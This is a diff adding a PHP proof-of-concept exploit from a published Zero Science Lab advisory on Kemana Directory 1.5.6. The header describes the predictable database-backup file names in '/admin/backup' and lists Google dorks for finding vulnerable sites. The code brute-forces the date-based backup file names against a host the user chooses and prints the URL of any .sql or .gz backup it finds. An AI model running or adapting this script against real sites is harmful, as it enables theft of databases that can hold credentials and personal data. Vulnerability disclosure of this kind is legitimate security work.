@@ -1,0 +1,177 @@
+<?php
+
+/*
+
+Kemana Directory 1.5.6 Database Backup Disclosure Exploit
+
+
+Vendor: C97net
+Product web page: http://www.c97.net
+Affected version: 1.5.6
+
+Summary: Experience the ultimate directory script solution
+with Kemana. Create your own Yahoo or Dmoz easily with Kemana.
+Unique Kemana's features including: CMS engine based on our
+qEngine, multiple directories support, user friendly administration
+control panel, easy to use custom fields, unsurpassed flexibility.
+
+Desc: Kemana stores database backups using the Backup DB tool
+with a predictable file name inside the '/admin/backup' directory
+as '_Full Backup YYYYMMDD_1.sql' or '_Full Backup YYYYMMDD_1.gz',
+which can be exploited to disclose sensitive information by
+downloading the file. The '/admin/backup' is also vulnerable to
+directory listing by default.
+
+
+Tested on: Apache/2.4.7 (Win32)
+           PHP/5.5.6
+           MySQL 5.6.14
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2014-5176
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5176.php
+
+
+Dork #1: intitle:powered by c97.net
+Dork #2: intitle:powered by qEngine
+Dork #3: intitle:powered by Kemana.c97.net
+Dork #4: intitle:powered by Cart2.c97.net
+
+
+
+07.03.2014
+
+*/
+
+
+error_reporting(0);
+
+function status($done, $total, $size=20)
+{
+	static $start_time;
+ 	if($done > $total) return;
+ 	if(empty($start_time)) $start_time=time();
+
+	$now = time();
+ 	$perc=(double)($done/$total);
+ 	$bar=floor($perc*$size);
+
+ 	$disp=number_format($perc*100, 0);
+ 
+	$status_bar="\r $disp% [";
+	$status_bar.=str_repeat("=", $bar);
+	if($bar<$size)
+	{
+		$status_bar.=">";
+		$status_bar.=str_repeat(" ", $size-$bar);
+	} else
+		{
+			$status_bar.="=";
+		}
+ 	
+ 	$status_bar.="] $done/$total";
+ 
+	$rate = ($now-$start_time)/$done;
+	$left = $total - $done;
+	$eta = round($rate * $left, 2);
+	$elapsed = $now - $start_time;
+ 
+	$status_bar.= " remaining: ".number_format($eta)." sec. elapsed: ".number_format($elapsed)." sec.";
+ 
+	echo "$status_bar ";
+	flush();
+ 
+	if($done == $total)
+	{
+		echo "\n";
+	}
+}
+
+print "
+ @---------------------------------------------------------------@
+ |                                                               |
+ |   Kemana Directory 1.5.6 Database Backup Disclosure Exploit   |
+ |                                                               |
+ |                                                               |
+ |              Copyleft (c) 2014, Zero Science Lab              |
+ |                                                               |
+ |                   Advisory ID: ZSL-2014-5176                  |
+ |                       www.zeroscience.mk                      |
+ |                                                               |
+ @---------------------------------------------------------------@
+	  ";
+
+if ($argc < 4)
+{
+    print "\n\n [+] Usage: php $argv[0] <host> <port> <dirname>\n\n";
+    print " [+] Example: php $argv[0] zeroscience.mk 80 hercules\n\n";
+    die();
+}
+
+$godina_array = array('2014','2013','2012','2011','2010');
+
+$mesec_array = array('12','11','10','09',
+					 '08','07','06','05',
+					 '04','03','02','01');
+
+$dn_array = array('31','30','29','28','27','26',
+				  '25','24','23','22','21','20',
+	  			  '19','18','17','16','15','14',
+				  '13','12','11','10','09','08',
+	  			  '07','06','05','04','03','02',
+	  			  '01');
+
+$host = $argv[1];
+$port = intval($argv[2]);
+$path = $argv[3];
+$dbnm = "Full%20Backup%20";
+
+$alert1 = "\033[1;31m";
+$alert2 = "\033[0;37m";
+$alert3 = "\033[1;32m";
+
+echo "\n [*] Running checks:\n\n";
+
+foreach($godina_array as $godina)
+{
+	foreach($mesec_array as $mesec)
+	{
+		$x++;
+		status($x, 58);
+		foreach($dn_array as $dn)
+		{
+			$ext=".gz";
+			if(file_get_contents("http://".$host.":".$port."/".$path."/admin/backup/_".$dbnm.$godina.$mesec.$dn."_1".$ext))
+			{
+				echo "\n";
+				echo $alert1;
+				print "\n\n\n !!! DATABASE BACKUP FILE FOUND !!!\n\n";
+				echo $alert2;
+				print " Filename: '_Full Backup ".$godina.$mesec.$dn."_1".$ext."'\n";
+				print " Full URL:\x20";
+				echo $alert3;
+				die("http://".$host.":".$port."/".$path."/admin/backup/_".$dbnm.$godina.$mesec.$dn."_1".$ext."\n\n");
+			}
+			$ext=".sql";
+			if(file_get_contents("http://".$host.":".$port."/".$path."/admin/backup/_".$dbnm.$godina.$mesec.$dn."_1".$ext))
+			{
+				echo "\n";
+				echo $alert1;
+				print "\n\n\n !!! DATABASE BACKUP FILE FOUND !!!\n\n";
+				echo $alert2;
+				print " Filename: '_Full Backup ".$godina.$mesec.$dn."_1".$ext."'\n";
+				print " Full URL:\x20";
+				echo $alert3;
+				die("http://".$host.":".$port."/".$path."/admin/backup/_".$dbnm.$godina.$mesec.$dn."_1".$ext."\n\n");
+			}
+		}
+	}
+}
+
+print "\n\n [*] Zero findings!\n\n\n";
+
+?>
